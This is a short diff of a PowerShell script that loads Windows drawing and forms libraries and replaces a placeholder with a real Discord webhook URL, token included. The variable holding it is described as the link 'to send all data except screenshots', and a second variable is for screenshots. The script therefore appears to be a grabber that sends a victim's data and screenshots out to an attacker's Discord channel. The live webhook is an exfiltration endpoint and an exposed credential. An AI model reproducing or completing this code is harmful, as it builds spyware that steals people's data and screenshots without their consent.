@@ -1,7 +1,7 @@
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
 
-$uri = "discord webhook link to send all data except screenshots"
+$uri = "https://discord.com/api/webhooks/1391405654085996685/OuectpCVpOaxBR1ubZ1yArM5Wu5NO7d-9c9700QNWW3DHM8lwlc0bDqvQmwhCIYz5yAO"
 $ssuri = "discord webhook link to send screenshots"
 
 function Send {
